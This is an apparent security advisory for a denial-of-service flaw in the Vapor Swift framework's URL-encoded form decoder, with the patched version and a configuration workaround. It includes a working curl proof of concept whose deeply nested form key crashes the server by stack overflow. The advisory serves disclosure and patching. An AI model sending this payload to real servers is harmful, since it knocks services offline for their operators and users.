summary: "Vapor vulnerable to denial of service in URLEncodedFormDecoder\nVapor is an HTTP web\
  \ framework for Swift. Vapor versions earlier than 4.61.1 are vulnerable to a denial of service\
  \ in the URLEncodedFormDecoder.\n\n### Impact\nWhen using automatic content decoding, e.g.\
  \ \n\n```swift\napp.post(\"foo\") { request -> String in\n  let foo = try request.content.decode(Foo.self)\n\
  \  return \"\\(foo)\"\n}\n```\n\nAn attacker can craft a request body that can make the server\
  \ crash with the following request:\n\n```\ncurl -d \"array[_0][0][array][_0][0][array]$(for\
  \ f in $(seq 1100); do echo -n '[_0][0][array]'; done)[string][_0]=hello%20world\" http://localhost:8080/foo\n\
  ```\n\nThe issue is unbounded, attacker controlled stack growth which will at some point lead\
  \ to a stack overflow.\n\n### Patches\nFixed in 4.61.1\n\n### Workarounds\nIf you don't need\
  \ to decode Form URL Encoded data, you can disable the `ContentConfiguration` so it won't\
  \ be used. E.g. in **configure.swift**\n\n```swift\nvar contentConfig = ContentConfiguration()\n\
  contentConfig.use(encoder: JSONEncoder.custom(dates: .iso8601), for: .json)\ncontentConfig.use(decoder:\
  \ JSONDecoder.custom(dates: .iso8601), for: .json)\ncontentConfig.use(encoder: JSONEncoder.custom(dates:\
  \ .iso8601), for: .jsonAPI)\ncontentConfig.use(decoder: JSONDecoder.custom(dates: .iso8601),\
  \ for: .jsonAPI)\nContentConfiguration.global = contentConfig\n```\n\n### For more information\n\
  If you have any questions or comments about this advisory:\n* Open an issue in [the Vapor\
  \ repo](https://github.com/vapor/vapor)\n* Ask in [Vapor Discord](http://vapor.team)"
